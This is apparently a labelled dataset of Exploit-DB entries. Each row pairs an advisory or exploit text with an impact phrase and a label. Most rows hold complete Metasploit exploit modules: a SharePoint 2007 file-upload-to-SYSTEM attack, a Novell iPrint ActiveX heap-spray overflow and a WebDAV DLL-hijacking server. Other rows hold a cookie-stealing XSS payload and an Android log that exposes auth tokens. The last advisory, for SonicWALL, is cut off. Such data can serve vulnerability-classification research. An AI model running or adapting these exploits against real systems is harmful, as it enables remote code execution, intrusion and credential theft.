37208,"backupDB() 1.2.7a - 'onlyDB' Cross-Site Scripting source: https://www.securityfocus.com/bid/53575/info  backupDB() is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.  backupDB() 1.2.7a is vulnerable; other versions may also be affected.  http://www.example.com/backupDB/backupDB.php?onlyDB=""><script>alert(document.cookie);</script>",execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site,1
20122,"Microsoft Office SharePoint Server 2007 - Remote Code Execution (MS10-104) (Metasploit) ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # web site for more information on licensing and terms of use. #   http://metasploit.com/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = ExcellentRanking  	include Msf::Exploit::Remote::Tcp 	include Msf::Exploit::EXE 	include Msf::Exploit::WbemExec  	def initialize 		super( 			'Name'        => 'Microsoft Office SharePoint Server 2007 Remote Code Execution', 			'Description'    => %q{ 					This module exploits a vulnerability found in SharePoint Server 2007 SP2. The 				software contains a directory traversal, that allows a remote attacker to write 				arbitrary files to the filesystem, sending a specially crafted SOAP ConvertFile 				request to the Office Document Conversions Launcher Service, which results in code 				execution under the context of 'SYSTEM'.  				The module uses uses the Windows Management Instrumentation service to execute an 				arbitrary payload on vulnerable installations of SharePoint on Windows 2003 Servers. 				It has been successfully tested on Office SharePoint Server 2007 SP2 over Windows 				2003 SP2. 			}, 			'Author'      => [ 				'Oleksandr Mirosh', # Vulnerability Discovery and PoC 				'James Burton', # Vulnerability analysis published at ""Entomology: A Case Study of Rare and Interesting Bugs"" 				'juan' # Metasploit module 			], 			'Platform'    => 'win', 			'References'  => 				[ 					[ 'CVE', '2010-3964' ], 					[ 'OSVDB', '69817' ], 					[ 'BID', '45264' ], 					[ 'MSB', 'MS10-104' ], 					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-10-287/' ] 				], 			'Targets'     => 				[ 					[ 'Microsoft Office SharePoint Server 2007 SP2 / Microsoft Windows Server 2003 SP2', { } ], 				], 			'DefaultTarget'  => 0, 			'Privileged'     => true, 			'DisclosureDate' => 'Dec 14 2010' 		)  		register_options( 			[ 				Opt::RPORT(8082), 				OptInt.new('DEPTH', [true, ""Levels to reach base directory"",7]) 			], self.class) 	end  	# Msf::Exploit::Remote::HttpClient is avoided because send_request_cgi doesn't get 	# the response maybe due to the 100 (Continue) status response even when the Expect 	# header isn't included in the request. 	def upload_file(file_name, contents)  		traversal = ""..\\"" * datastore['DEPTH']  		soap_convert_file = ""<SOAP-ENV:Envelope xmlns:xsi=\""http://www.w3.org/2001/XMLSchema-instance\"" "" 		soap_convert_file << ""xmlns:xsd=\""http://www.w3.org/2001/XMLSchema\"" "" 		soap_convert_file << ""xmlns:SOAP-ENC=\""http://schemas.xmlsoap.org/soap/encoding/\"" "" 		soap_convert_file << ""xmlns:SOAP-ENV=\""http://schemas.xmlsoap.org/soap/envelope/\"" "" 		soap_convert_file << ""xmlns:clr=\""http://schemas.microsoft.com/soap/encoding/clr/1.0\"" "" 		soap_convert_file << ""SOAP-ENV:encodingStyle=\""http://schemas.xmlsoap.org/soap/encoding/\"">"" << ""\x0d\x0a"" 		soap_convert_file << ""<SOAP-ENV:Body>"" << ""\x0d\x0a"" 		soap_convert_file << ""<i2:ConvertFile id=\""ref-1\"" "" 		soap_convert_file << ""xmlns:i2=\""http://schemas.microsoft.com/clr/nsassem/Microsoft.HtmlTrans.IDocumentConversionsLauncher/Microsoft.HtmlTrans.Interface\"">"" << ""\x0d\x0a"" 		soap_convert_file << ""<launcherUri id=\""ref-3\"">http://#{rhost}:8082/HtmlTrLauncher</launcherUri>"" << ""\x0d\x0a"" 		soap_convert_file << ""<appExe id=\""ref-4\""></appExe>"" << ""\x0d\x0a"" 		soap_convert_file << ""<convertFrom id=\""ref-5\"">#{traversal}#{file_name}</convertFrom>"" << ""\x0d\x0a"" 		soap_convert_file << ""<convertTo id=\""ref-6\"">html</convertTo>"" << ""\x0d\x0a"" 		soap_convert_file << ""<fileBits href=\""#ref-7\""/>"" << ""\x0d\x0a"" 		soap_convert_file << ""<taskName id=\""ref-8\"">brochure_to_html</taskName>"" << ""\x0d\x0a"" 		soap_convert_file << ""<configInfo id=\""ref-9\""></configInfo>"" << ""\x0d\x0a"" 		soap_convert_file << ""<timeout>20</timeout>"" << ""\x0d\x0a"" 		soap_convert_file << ""<fReturnFileBits>true</fReturnFileBits>"" << ""\x0d\x0a"" 		soap_convert_file << ""</i2:ConvertFile>"" << ""\x0d\x0a"" 		soap_convert_file << ""<SOAP-ENC:Array id=\""ref-7\"" xsi:type=\""SOAP-ENC:base64\"">#{Rex::Text.encode_base64(contents)}</SOAP-ENC:Array>"" << ""\x0d\x0a"" 		soap_convert_file << ""</SOAP-ENV:Body>"" << ""\x0d\x0a"" 		soap_convert_file << ""</SOAP-ENV:Envelope>"" << ""\x0d\x0a""  		http_request = ""POST /HtmlTrLauncher HTTP/1.1"" << ""\x0d\x0a"" 		http_request << ""User-Agent: Mozilla/4.0+(compatible; MSIE 6.0; Windows 5.2.3790.131072; MS .NET Remoting; MS .NET CLR 2.0.50727.42 )"" << ""\x0d\x0a"" 		http_request << ""Content-Type: text/xml; charset=\""utf-8\"""" << ""\x0d\x0a"" 		http_request << ""SOAPAction: \""http://schemas.microsoft.com/clr/nsassem/Microsoft.HtmlTrans.IDocumentConversionsLauncher/Microsoft.HtmlTrans.Interface#ConvertFile\"""" << ""\x0d\x0a"" 		http_request << ""Host: #{rhost}:#{rport}"" << ""\x0d\x0a"" 		http_request << ""Content-Length: #{soap_convert_file.length}"" << ""\x0d\x0a"" 		http_request << ""Connection: Keep-Alive"" << ""\x0d\x0a\x0d\x0a""  		connect 		sock.put(http_request << soap_convert_file) 		data = """" 		read_data = sock.get_once(-1, 1) 		while not read_data.nil? 			data << read_data 			read_data = sock.get_once(-1, 1) 		end 		disconnect 		return data 	end  	# The check tries to create a test file in the root 	def check  		peer = ""#{rhost}:#{rport}"" 		filename = rand_text_alpha(rand(10)+5) + '.txt' 		contents = rand_text_alpha(rand(10)+5)  		print_status(""#{peer} - Sending HTTP ConvertFile Request to upload the test file #{filename}"") 		res = upload_file(filename, contents)  		if res and res =~ /200 OK/ and res =~ /ConvertFileResponse/ and res =~ /<m_ce>CE_OTHER<\/m_ce>/ 			return Exploit::CheckCode::Vulnerable 		else 			return Exploit::CheckCode::Safe 		end 	end  	def exploit  		peer = ""#{rhost}:#{rport}""  		# Setup the necessary files to do the wbemexec trick 		exe_name = rand_text_alpha(rand(10)+5) + '.exe' 		exe      = generate_payload_exe 		mof_name = rand_text_alpha(rand(10)+5) + '.mof' 		mof      = generate_mof(mof_name, exe_name)  		print_status(""#{peer} - Sending HTTP ConvertFile Request to upload the exe payload #{exe_name}"") 		res = upload_file(""WINDOWS\\system32\\#{exe_name}"", exe) 		if res and res =~ /200 OK/ and res =~ /ConvertFileResponse/ and res =~ /<m_ce>CE_OTHER<\/m_ce>/ 			print_good(""#{peer} - #{exe_name} uploaded successfully"") 		else 			print_error(""#{peer} - Failed to upload #{exe_name}"") 			return 		end  		print_status(""#{peer} - Sending HTTP ConvertFile Request to upload the mof file #{mof_name}"") 		res = upload_file(""WINDOWS\\system32\\wbem\\mof\\#{mof_name}"", mof) 		if res and res =~ /200 OK/ and res =~ /ConvertFileResponse/ and res =~ /<m_ce>CE_OTHER<\/m_ce>/ 			print_good(""#{peer} - #{mof_name} uploaded successfully"") 		else 			print_error(""#{peer} - Failed to upload #{mof_name}"") 			return 		end  	end  end",write arbitrary files to the filesystem,1
16508,"Novell iPrint Client - ActiveX Control Buffer Overflow (Metasploit) ## # $Id: novelliprint_getdriversettings.rb$ ##  ### # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'   class Metasploit3 < Msf::Exploit::Remote 	Rank = NormalRanking  	include Msf::Exploit::Remote::HttpServer::HTML  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'Novell iPrint Client ActiveX Control Buffer Overflow', 			'Description'    => %q{ 					This module exploits a stack buffer overflow in Novell iPrint Client 4.34. When 				sending an overly long string to the GetDriverSettings() property of ienipp.ocx 				an attacker may be able to execute arbitrary code. 			}, 			'License'        => MSF_LICENSE, 			'Author'         => [ 'MC' ], 			'Version'        => '$Revision: 10394 $', 			'References'     => 				[ 					[ 'CVE', '2008-2908'], 					[ 'OSVDB', '46194'], 					[ 'URL', 'http://secunia.com/advisories/30709/' ], 				], 			'DefaultOptions' => 				{ 					'EXITFUNC' => 'process', 				}, 			'Payload'        => 				{ 					'Space'         => 1024, 					'BadChars'      => ""\x00"", 				}, 			'Platform'       => 'win', 			'Targets'        => 				[ 					[ 'Windows XP SP0-SP3 / Windows Vista / IE 6.0 SP0-SP2 / IE 7', { 'Ret' => 0x0A0A0A0A } ] 				], 			'DisclosureDate' => 'Jun 16 2008', 			'DefaultTarget'  => 0)) 	end  	def autofilter 		false 	end  	def check_dependencies 		use_zlib 	end  	def on_request_uri(cli, request) 		# Re-generate the payload. 		return if ((p = regenerate_payload(cli)) == nil)  		# Encode the shellcode. 		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))  		# Create some nops. 		nops    = Rex::Text.to_unescape(make_nops(4))  		# Set the return. 		ret     = Rex::Text.uri_encode([target.ret].pack('L'))  		# Randomize the javascript variable names. 		vname  = rand_text_alpha(rand(100) + 1) 		var_i  = rand_text_alpha(rand(30)  + 2) 		rand1  = rand_text_alpha(rand(100) + 1) 		rand2  = rand_text_alpha(rand(100) + 1) 		rand3  = rand_text_alpha(rand(100) + 1) 		rand4  = rand_text_alpha(rand(100) + 1) 		rand5  = rand_text_alpha(rand(100) + 1) 		rand6  = rand_text_alpha(rand(100) + 1) 		rand7  = rand_text_alpha(rand(100) + 1) 		rand8  = rand_text_alpha(rand(100) + 1)  		content = %Q|<html> <object id='#{vname}' classid='clsid:36723F97-7AA0-11D4-8919-FF2D71D0D32C'></object> <script language=""JavaScript""> var #{rand1} = unescape('#{shellcode}'); var #{rand2} = unescape('#{nops}'); var #{rand3} = 20; var #{rand4} = #{rand3} + #{rand1}.length; while (#{rand2}.length < #{rand4}) #{rand2} += #{rand2}; var #{rand5} = #{rand2}.substring(0,#{rand4}); var #{rand6} = #{rand2}.substring(0,#{rand2}.length - #{rand4}); while (#{rand6}.length + #{rand4} < 0x40000) #{rand6} = #{rand6} + #{rand6} + #{rand5}; var #{rand7} = new Array(); for (#{var_i} = 0; #{var_i} < 700; #{var_i}++){ #{rand7}[#{var_i}] = #{rand6} + #{rand1} } var #{rand8} = """"; for (#{var_i} = 0; #{var_i} < 99024; #{var_i}++) { #{rand8} = #{rand8} + unescape('#{ret}') } #{vname}.GetDriverSettings(#{rand8}, #{vname}, #{vname}, #{vname}); </script> </html> |  		content = Rex::Text.randomize_space(content)  		print_status(""Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}..."")  		# Transmit the response to the client 		send_response_html(cli, content)  		# Handle the payload 		handler(cli) 	end  end",execute arbitrary code,1
16550,"WebDAV - Application DLL Hijacker (Metasploit) ## # $Id: webdav_dll_hijacker.rb 10454 2010-09-24 01:11:05Z jduck $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'   class Metasploit3 < Msf::Exploit::Remote 	Rank = ManualRanking  	# 	# This module acts as an HTTP server 	# 	include Msf::Exploit::Remote::HttpServer::HTML 	include Msf::Exploit::EXE  	def initialize(info = {}) 		super(update_info(info, 			'Name'			=> 'WebDAV Application DLL Hijacker', 			'Description'	=> %q{ 				This module presents a directory of file extensions that can lead to 			code execution when opened from the share. The default EXTENSIONS option 			must be configured to specify a vulnerable application type. 			}, 			'Author'		=> 				[ 					'hdm',   # Module itself 					'jduck', # WebDAV implementation 					'jcran', # Exploit vectors 				], 			'License'		=> MSF_LICENSE, 			'Version'		=> '$Revision: 10454 $', 			'References'	=> 				[ 					['URL', 'http://blog.zoller.lu/2010/08/cve-2010-xn-loadlibrarygetprocaddress.html'], 					['URL', 'http://www.acrossecurity.com/aspr/ASPR-2010-08-18-1-PUB.txt'], 				], 			'DefaultOptions' => 				{ 					'EXITFUNC' => 'process', 				}, 			'Payload'		=> 				{ 					'Space'	=> 2048, 				}, 			'Platform'		=> 'win', 			'Targets'		=> 				[ 					[ 'Automatic',	{ } ] 				], 			'DisclosureDate' => 'Aug 18 2010', 			'DefaultTarget'  => 0))  		register_options( 			[ 				OptPort.new(	'SRVPORT',		 [ true, ""The daemon port to listen on (do not change)"", 80 ]), 				OptString.new(	'URIPATH',		 [ true, ""The URI to use (do not change)."", ""/"" ]), 				OptString.new(	'BASENAME',		 [ true, ""The base name for the listed files."", ""policy"" ]), 				OptString.new(	'SHARENAME',	 [ true, ""The name of the top-level share."", ""documents"" ]), 				OptString.new(	'EXTENSIONS',	 [ true, ""The list of extensions to generate"", ""txt"" ]) 			], self.class)  		deregister_options('SSL', 'SSLVersion') # WebDAV does not support SSL 	end   	def on_request_uri(cli, request)  		case request.method 		when 'OPTIONS' 			process_options(cli, request) 		when 'PROPFIND' 			process_propfind(cli, request) 		when 'GET' 			process_get(cli, request) 		else 			print_status(""#{cli.peerhost}:#{cli.peerport} #{request.method} => 404 (#{request.uri})"") 			resp = create_response(404, ""Not Found"") 			resp.body = """" 			resp['Content-Type'] = 'text/html' 			cli.send_response(resp) 		end 	end   	def process_get(cli, request)  		myhost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST'] 		webdav = ""\\\\#{myhost}\\""  		if blacklisted_path?(request.uri) 			print_status(""#{cli.peerhost}:#{cli.peerport} GET => 404 [BLACKLIST] (#{request.uri})"") 			resp = create_response(404, ""Not Found"") 			resp.body = """" 			cli.send_response(resp) 			return 		end  		if (request.uri =~ /\.(dll|dl|drv|cpl)$/i) 			print_status(""#{cli.peerhost}:#{cli.peerport} GET => DLL Payload"") 			return if ((p = regenerate_payload(cli)) == nil) 			data = generate_payload_dll({ :code => p.encoded }) 			send_response(cli, data, { 'Content-Type' => 'application/octet-stream' }) 			return 		end  		# Treat index.html specially 		if (request.uri[-1,1] == ""/"" or request.uri =~ /index\.html?$/i) 			print_status(""#{cli.peerhost}:#{cli.peerport} GET => REDIRECT (#{request.uri})"") 			resp = create_response(200, ""OK"")  			resp.body = %Q|<html><head><meta http-equiv=""refresh"" content=""0;URL=#{@exploit_unc}#{datastore['SHARENAME']}\\""></head><body></body></html>|  			resp['Content-Type'] = 'text/html' 			cli.send_response(resp) 			return 		end  		# Anything else is probably a request for a data file... 		print_status(""#{cli.peerhost}:#{cli.peerport} GET => DATA (#{request.uri})"") 		data = ""HELLO!"" 		send_response(cli, data, { 'Content-Type' => 'application/octet-stream' }) 	end  	# 	# OPTIONS requests sent by the WebDav Mini-Redirector 	# 	def process_options(cli, request) 		print_status(""#{cli.peerhost}:#{cli.peerport} OPTIONS #{request.uri}"") 		headers = { 			'MS-Author-Via' => 'DAV', 			'DASL'          => '<DAV:sql>', 			'DAV'           => '1, 2', 			'Allow'         => 'OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH', 			'Public'        => 'OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK', 			'Cache-Control' => 'private' 		} 		resp = create_response(207, ""Multi-Status"") 		headers.each_pair {|k,v| resp[k] = v } 		resp.body = """" 		resp['Content-Type'] = 'text/xml' 		cli.send_response(resp) 	end  	# 	# PROPFIND requests sent by the WebDav Mini-Redirector 	# 	def process_propfind(cli, request) 		path = request.uri 		print_status(""#{cli.peerhost}:#{cli.peerport} PROPFIND #{path}"") 		body = ''  		my_host   = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST'] 		my_uri    = ""http://#{my_host}/""  		if path !~ /\/$/  			if blacklisted_path?(path) 				print_status ""#{cli.peerhost}:#{cli.peerport} PROPFIND => 404 (#{path})"" 				resp = create_response(404, ""Not Found"") 				resp.body = """" 				cli.send_response(resp) 				return 			end  			if path.index(""."") 				print_status ""#{cli.peerhost}:#{cli.peerport} PROPFIND => 207 File (#{path})"" 				body = %Q|<?xml version=""1.0"" encoding=""utf-8""?> <D:multistatus xmlns:D=""DAV:"" xmlns:b=""urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/""> <D:response xmlns:lp1=""DAV:"" xmlns:lp2=""http://apache.org/dav/props/""> <D:href>#{path}</D:href> <D:propstat> <D:prop> <lp1:resourcetype/> <lp1:creationdate>#{gen_datestamp}</lp1:creationdate> <lp1:getcontentlength>#{rand(0x100000)+128000}</lp1:getcontentlength> <lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified> <lp1:getetag>""#{""%.16x"" % rand(0x100000000)}""</lp1:getetag> <lp2:executable>T</lp2:executable> <D:supportedlock> <D:lockentry> <D:lockscope><D:exclusive/></D:lockscope> <D:locktype><D:write/></D:locktype> </D:lockentry> <D:lockentry> <D:lockscope><D:shared/></D:lockscope> <D:locktype><D:write/></D:locktype> </D:lockentry> </D:supportedlock> <D:lockdiscovery/> <D:getcontenttype>application/octet-stream</D:getcontenttype> </D:prop> <D:status>HTTP/1.1 200 OK</D:status> </D:propstat> </D:response> </D:multistatus> | 				# send the response 				resp = create_response(207, ""Multi-Status"") 				resp.body = body 				resp['Content-Type'] = 'text/xml; charset=""utf8""' 				cli.send_response(resp) 				return 			else 				print_status ""#{cli.peerhost}:#{cli.peerport} PROPFIND => 301 (#{path})"" 				resp = create_response(301, ""Moved"") 				resp[""Location""] = path + ""/"" 				resp['Content-Type'] = 'text/html' 				cli.send_response(resp) 				return 			end 		end  		print_status ""#{cli.peerhost}:#{cli.peerport} PROPFIND => 207 Directory (#{path})"" 		body = %Q|<?xml version=""1.0"" encoding=""utf-8""?> <D:multistatus xmlns:D=""DAV:"" xmlns:b=""urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/""> 	<D:response xmlns:lp1=""DAV:"" xmlns:lp2=""http://apache.org/dav/props/""> 		<D:href>#{path}</D:href> 		<D:propstat> 			<D:prop> 				<lp1:resourcetype><D:collection/></lp1:resourcetype> 				<lp1:creationdate>#{gen_datestamp}</lp1:creationdate> 				<lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified> 				<lp1:getetag>""#{""%.16x"" % rand(0x100000000)}""</lp1:getetag> 				<D:supportedlock> 					<D:lockentry> 						<D:lockscope><D:exclusive/></D:lockscope> 						<D:locktype><D:write/></D:locktype> 					</D:lockentry> 					<D:lockentry> 						<D:lockscope><D:shared/></D:lockscope> 						<D:locktype><D:write/></D:locktype> 					</D:lockentry> 				</D:supportedlock> 				<D:lockdiscovery/> 				<D:getcontenttype>httpd/unix-directory</D:getcontenttype> 			</D:prop> 		<D:status>HTTP/1.1 200 OK</D:status> 	</D:propstat> </D:response> |  		if request[""Depth""].to_i > 0 			trail = path.split(""/"") 			trail.shift 			case trail.length 			when 0 				body << generate_shares(path) 			when 1 				body << generate_files(path) 			end 		else 			print_status ""#{cli.peerhost}:#{cli.peerport} PROPFIND => 207 Top-Level Directory"" 		end  		body << ""</D:multistatus>""  		body.gsub!(/\t/, '')  		# send the response 		resp = create_response(207, ""Multi-Status"") 		resp.body = body 		resp['Content-Type'] = 'text/xml; charset=""utf8""' 		cli.send_response(resp) 	end  	def generate_shares(path) 		share_name = datastore['SHARENAME'] %Q| <D:response xmlns:lp1=""DAV:"" xmlns:lp2=""http://apache.org/dav/props/""> <D:href>#{path}#{share_name}/</D:href> <D:propstat> <D:prop> <lp1:resourcetype><D:collection/></lp1:resourcetype> <lp1:creationdate>#{gen_datestamp}</lp1:creationdate> <lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified> <lp1:getetag>""#{""%.16x"" % rand(0x100000000)}""</lp1:getetag> <D:supportedlock> <D:lockentry> <D:lockscope><D:exclusive/></D:lockscope> <D:locktype><D:write/></D:locktype> </D:lockentry> <D:lockentry> <D:lockscope><D:shared/></D:lockscope> <D:locktype><D:write/></D:locktype> </D:lockentry> </D:supportedlock> <D:lockdiscovery/> <D:getcontenttype>httpd/unix-directory</D:getcontenttype> </D:prop> <D:status>HTTP/1.1 200 OK</D:status> </D:propstat> </D:response> | 	end  	def generate_files(path) 		trail = path.split(""/"") 		return """" if trail.length < 2  		base  = datastore['BASENAME'] 		exts  = datastore['EXTENSIONS'].gsub("","", "" "").split(/\s+/) 		files = """" 		exts.each do |ext| 			files << %Q| <D:response xmlns:lp1=""DAV:"" xmlns:lp2=""http://apache.org/dav/props/""> <D:href>#{path}#{base}.#{ext}</D:href> <D:propstat> <D:prop> <lp1:resourcetype/> <lp1:creationdate>#{gen_datestamp}</lp1:creationdate> <lp1:getcontentlength>#{rand(0x10000)+120}</lp1:getcontentlength> <lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified> <lp1:getetag>""#{""%.16x"" % rand(0x100000000)}""</lp1:getetag> <lp2:executable>T</lp2:executable> <D:supportedlock> <D:lockentry> <D:lockscope><D:exclusive/></D:lockscope> <D:locktype><D:write/></D:locktype> </D:lockentry> <D:lockentry> <D:lockscope><D:shared/></D:lockscope> <D:locktype><D:write/></D:locktype> </D:lockentry> </D:supportedlock> <D:lockdiscovery/> <D:getcontenttype>application/octet-stream</D:getcontenttype> </D:prop> <D:status>HTTP/1.1 200 OK</D:status> </D:propstat> </D:response> | 		end  		files 	end  	def gen_timestamp(ttype=nil) 		::Time.now.strftime(""%a, %d %b %Y %H:%M:%S GMT"") 	end  	def gen_datestamp(ttype=nil) 		::Time.now.strftime(""%Y-%m-%dT%H:%M:%SZ"") 	end  	# This method rejects requests that are known to break exploitation 	def blacklisted_path?(uri) 		return true if uri =~ /\.exe/i 		return true if uri =~ /\.(config|manifest)/i 		return true if uri =~ /desktop\.ini/i 		return true if uri =~ /lib.*\.dll/i 		return true if uri =~ /\.tmp$/i 		return true if uri =~ /(pcap|packet)\.dll/i 		false 	end  	def exploit  		myhost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address('50.50.50.50') : datastore['SRVHOST']  		@exploit_unc  = ""\\\\#{myhost}\\""  		if datastore['SRVPORT'].to_i != 80 || datastore['URIPATH'] != '/' 			raise RuntimeError, 'Using WebDAV requires SRVPORT=80 and URIPATH=/' 		end  		print_status("""") 		print_status(""Exploit links are now available at #{@exploit_unc}#{datastore['SHARENAME']}\\"") 		print_status("""")  		super 	end end",code execution,1
39061,"GoToMeeting for Android - Multiple Local Information Disclosure Vulnerabilities source: https://www.securityfocus.com/bid/65123/info  GoToMeeting for Android is prone to multiple local information-disclosure vulnerabilities.  Local attackers can exploit these issues to obtain sensitive information, which may aid in further attacks.  GoToMeeting 5.0.799.1238 is vulnerable; other versions may also be affected.   <! ----- SNIPPET ------- !>  D/G2M     (32190): HttpRequest to:  https://www.example.com/meeting/getInfo/[MEETING_ID_REDACTED]?Portal=www.gotomeeting.com&android=true&MeetingID=[MEETING_ID_REDACTED] E/qcom_sensors_hal(  787): hal_process_report_ind: Bad item quality: 11  D/dalvikvm(32190): GC_CONCURRENT freed 1322K, 43% free 20491K/35456K, paused 6ms+1ms, total 33ms D/G2M     (32190): HttpRequest response from: GET  https://www.example.com/meeting/getInfo/[MEETING_ID_REDACTED]?Portal=www.gotomeeting.com&android=true&MeetingID=[MEETING_ID_REDACTED]  -> 200 D/G2M     (32190): HttpRequest response body: GET  https://www.example.com/meeting/getInfo/[MEETING_ID_REDACTED]?Portal=www.gotomeeting.com&android=true&MeetingID=[MEETING_ID_REDACTED]  -> {""Status"":""Redirect"",""RedirectHost"":""www1.gotomeeting.com"",""MeetingId"":""[MEETING_ID_REDACTED]""} D/G2M     (32190): Got 302 from legacy JSON API: www1.gotomeeting.com D/G2M     (32190): HttpRequest to:  https://www.example.com/meeting/getInfo/[MEETING_ID_REDACTED]?android=true&MeetingID=[MEETING_ID_REDACTED] D/G2M     (32190): HttpRequest response from: GET  https://www.example.com/meeting/getInfo/[MEETING_ID_REDACTED]?android=true&MeetingID=[MEETING_ID_REDACTED] -> 200 D/G2M     (32190): HttpRequest response body: GET  https://www.example.com/meeting/getInfo/[MEETING_ID_REDACTED]?android=true&MeetingID=[MEETING_ID_REDACTED] ->  {""Status"":""MeetingNotStarted"",""MeetingId"":""[MEETING_ID_REDACTED]"",""IsRecurring"":false,""Endpoints"":[""Native""],""OrganizerName"":""[REDACTED]"",""Subject"":""[REDACTED]"",""MaxAttendees"":100,""IsWebinar"":false,""AudioParameters"":{""CommParams"":{""disableUdp"":false},""ConferenceParams"":{""supportedModes"":""VoIP,PSTN,Private"",""initialMode"":""Hybrid"",""SpeakerInfo"":{""PhoneInfo"":[{""description"":""Default"",""number"":""[REDACTED],""authToken"":""AAFe4rYexu4Dm7qrL45/Egx+AAAAAFLdeSkAAAAAUt7KqUbWYmXH3OcczkhGaWRf0wM2OKWa"",""accessCode"":""REDACTED""},""userId"":""userId"",""authToken"":""EAEBAQEBAQEBAQEBAQEBAQE="",""privateMessage"":"""",""audioKey"":-1,""BridgeMutingControl"":true,""VCBParams"":{""Codec"":[{""payloadType"":103,""frameLength"":30,""name"":""ISAC"",""bitrate"":32000,""channels"":1,""samplingRate"":16000},{""payloadType"":0,""frameLength"":20,""name"":""PCMU"",""bitrate"":64000,""ch   annels"":1,""samplingRate"":8000}],""VCB"":{""port"":5060,""ipAddr"":""10.23.70.151""},""Options"":{""asUpdates"":true,""rtUpdates"":true,""dtx"":false}}}},""EndTime"":1390239900000,""StartTime"":1390237200000,""IsImpromptu"":false} D/G2M     (32190): Got response from legacy JSON API: 200 D/G2M     (32190): JoinService: Attempting to join Meeting D/G2M     (32190): MeetingService: Starting Meeting join on legacy... D/G2M     (32190): HttpRequest to:  https://www.example.com/meeting/getInfo/[MEETING_ID_REDACTED]?android=true&MeetingID=[MEETING_ID_REDACTED]&PhoneInfo=,MachineID=WFNUUVtWBVRUVwRQAwUCAA==,G2MAppVersion=5.0.799.1238,BuildType=releaseBuild,Brand=google,Manufacturer=LGE,Model=Nexus5,AndroidVersionRelease=4.4.2,AndroidVersionIncremental=937116,ID=KOT49H,Product=hammerhead,Device=hammerhead,CpuABI=armeabi-v7a D/G2M     (32190): ServiceResolver: COLService: BaseURL [https://www.example.com], isLegacy [true}, isWebinar  [false] D/G2M     (32190): HttpRequest response from: GET  https://www.example.com/meeting/getInfo/[MEETING_ID_REDACTED]?Portal=www.gotomeeting.com&android=true&MeetingID=[MEETING_ID_REDACTED]&PhoneInfo=,MachineID=WFNUUVtWBVRUVwRQAwUCAA==,G2MAppVersion=5.0.799.1238,BuildType=releaseBuild,Brand=google,Manufacturer=LGE,Model=Nexus5,AndroidVersionRelease=4.4.2,AndroidVersionIncremental=937116,ID=KOT49H,Product=hammerhead,Device=hammerhead,CpuABI=armeabi-v7a  -> 302 D/G2M     (32190): HttpRequest response body: GET  https://www.example.com/meeting/getInfo/[MEETING_ID_REDACTED]?Portal=www.gotomeeting.com&android=true&MeetingID=[MEETING_ID_REDACTED]&PhoneInfo=,MachineID=WFNUUVtWBVRUVwRQAwUCAA==,G2MAppVersion=5.0.799.1238,BuildType=releaseBuild,Brand=google,Manufacturer=LGE,Model=Nexus5,AndroidVersionRelease=4.4.2,AndroidVersionIncremental=937116,ID=KOT49H,Product=hammerhead,Device=hammerhead,CpuABI=armeabi-v7a  -> <!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN"">  <! ----- SNIPPET ------- !>",information-disclosure,1
20383,"Microsoft IIS 4.0 - ISAPI Buffer Overflow source: https://www.securityfocus.com/bid/1911/info  The ASP ISAPI file parser does not properly execute certain malformed ASP files that contain scripts with the LANGUAGE parameter containing a buffer of over 2200 characters and have the RUNAT value set as 'server'. Depending on the data entered into the buffer, a denial of service attack could be launched or arbitrary code could be executed under the SYSTEM privilege level in the event that a malicious ASP file were locally executed on IIS.  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/20383.zip",denial of service,1
21394,"SonicWALL email security 7.3.5 - Multiple Vulnerabilities Title: ====== SonicWALL EMail Security 7.3.5 - Multiple Vulnerabilities   Date: ===== 2012-08-14   References: =========== http://www.vulnerability-lab.com/get_content.php?id=543   VL-ID: ===== 543   Common Vulnerability Scoring System: ==================================== 3.5   Introduction: ============= While most businesses now have some type of anti-spam protection, many must deal with cumbersome  management, frustrated users, inflexible solutions, and a higher-than-expected total cost of ownership.  SonicWALL® Email Security can help. Elegantly simple to deploy, manage and use, award-winning SonicWALL  Email Security solutions employ a variety of proven and patented technology designed to block spam and  other threats effectively, easily and economically. With innovative protection techniques for both  inbound and outbound email plus unique management tools, the Email Security platform delivers superior  email protection today—while standing ready to stop the new attacks of tomorrow.  SonicWALL Email Security can be flexibly deployed as a SonicWALL Email Security Appliance, as a software  application on a third party Windows® server, or as a SonicWALL Email Security Virtual Appliance in a  VMW® environment. The SonicWALL Email Security Virtual Appliance provides the same powerful protection as a  traditional SonicWALL Email Security appliance, only in a virtual form, to optimize utilization,  ease migration and reduce capital costs.  (Copy of the Vendor Homepage: http://www.sonicwall.com/us/products/Anti-Spam_Email_Security.html)   Abstract: ========= Vulnerability Laboratory Research Team discovered multiple Web Vulnerabilities in SonicWalls UTM Email Security 